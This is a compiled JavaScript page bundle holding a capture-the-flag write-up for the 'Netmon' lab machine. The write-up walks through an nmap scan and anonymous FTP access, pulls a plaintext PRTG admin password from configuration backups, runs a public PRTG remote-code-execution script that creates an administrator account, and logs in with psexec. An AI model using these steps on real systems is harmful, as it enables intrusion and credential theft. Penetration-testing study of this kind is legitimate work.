(window.webpackJsonp=window.webpackJsonp||[]).push([[84],{426:function(s,t,e){"use strict";e.r(t);var n=e(13),a=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"netmon"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#netmon"}},[s._v("#")]),s._v(" Netmon")]),s._v(" "),t("p",[t("code",[s._v("10.10.10.152")])]),s._v(" "),t("h2",{attrs:{id:"nmap-scan"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#nmap-scan"}},[s._v("#")]),s._v(" Nmap scan")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("nmap "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-A")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-T5")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.152\n")])])]),t("p",[s._v("results")]),s._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 22:42 EDT\nWarning: 10.10.10.152 giving up on port because retransmission cap hit (2).\nNmap scan report for 10.10.10.152\nHost is up (0.20s latency).\nNot shown: 924 closed ports, 71 filtered ports\nPORT    STATE SERVICE      VERSION\n21/tcp  open  ftp          Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 02-03-19  12:18AM                 1024 .rnd\n| 02-25-19  10:15PM       <DIR>          inetpub\n| 07-16-16  09:18AM       <DIR>          PerfLogs\n| 02-25-19  10:56PM       <DIR>          Program Files\n| 02-03-19  12:28AM       <DIR>          Program Files (x86)\n| 02-03-19  08:08AM       <DIR>          Users\n|_02-25-19  11:49PM       <DIR>          Windows\n| ftp-syst: \n|_  SYST: Windows_NT\n80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)\n|_http-server-header: PRTG/18.1.37.13946\n| http-title: Welcome | PRTG Network Monitor (NETMON)\n|_Requested resource was /index.htm\n|_http-trane-info: Problem with XML parsing of /evox/about\n135/tcp open  msrpc        Microsoft Windows RPC\n139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 1m29s, deviation: 0s, median: 1m28s\n|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)\n| smb-security-mode: \n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2020-04-13T02:44:28\n|_  start_date: 2020-04-12T23:04:18\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 40.31 seconds\n")])])]),t("h2",{attrs:{id:"enumeration"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#enumeration"}},[s._v("#")]),s._v(" Enumeration")]),s._v(" "),t("h3",{attrs:{id:"ftp"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ftp"}},[s._v("#")]),s._v(" FTP")]),s._v(" "),t("p",[s._v("Going into the FTP server to take a look around:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ftp")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.152\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Username: Anonymous")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Password: Anonymous")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# find the user.txt file")]),s._v("\nget user.txt\n")])])]),t("p",[s._v("and we have our user flag.")]),s._v(" "),t("h3",{attrs:{id:"netmon-2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#netmon-2"}},[s._v("#")]),s._v(" Netmon")]),s._v(" "),t("p",[s._v("Looking at the netmon version of "),t("code",[s._v("PRTG 18.1.37.13946")]),s._v(", we find that it used to store passwords in plain text. Let's use the FTP server to find that plaintext file.")]),s._v(" "),t("p",[s._v("A reddit post was found: https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ftp")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.152\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" programdata\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" paessler\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"PRTG Network Monitor"')]),s._v("\nget "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"PRTG Configuration.dat"')]),s._v("\nget "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"PRTG Configuration.old"')]),s._v("\nget "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"PRTG Configuration.old.bak"')]),s._v("\n")])])]),t("p",[s._v("Locally on the machine:")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'PRTG Configuration.old.bak'")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-B")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"prtgadmin"')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#             </dbauth>")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#             <dbcredentials>")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#               0")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#             </dbcredentials>")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#             <dbpassword>")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#               \x3c!-- User: prtgadmin --\x3e")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# --                ")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#                 </homepage>")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#                 <lastlogin>")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#                   43499.7768071065")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#                 </lastlogin>")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#                 <login>")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#                   prtgadmin")]),s._v("\n")])])]),t("p",[s._v("The password is "),t("code",[s._v("PrTg@dmin2019")]),s._v(" instead of "),t("code",[s._v("PrTg@dmin2018")]),s._v(".")]),s._v(" "),t("p",[s._v("Now using burpsuite to get the cookie of this login and then use the script by https://github.com/M4LV0/PRTG-Network-Monitor-RCE")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("./prtg-exploit.sh "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" http://10.10.10.152 "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"_ga=GA1.4.781493792.1586746211; _gid=GA1.4.661617980.1586746211; OCTOPUS1813713946=ezYwM0M1MEU4LTdCQzItNEExRC1BRTVFLTFFODM3RDZDRjdFNn0%3D; _gat=1"')]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Final result: exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!")]),s._v("\n")])])]),t("p",[s._v("Now the exploit is done and we can use "),t("code",[s._v("psexec")]),s._v(" to login from https://github.com/SecureAuthCorp/impacket (remember to "),t("code",[s._v("pip install .")]),s._v(" for this repo) using "),t("code",[s._v("impacket")])]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" impacket-master/examples\n./psexec.py pentest@10.10.10.152\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# enter password P3nT3st!")]),s._v("\n")])])]),t("p",[s._v("and now we hvae root.")])])}),[],!1,null,null,null);t.default=a.exports}}]);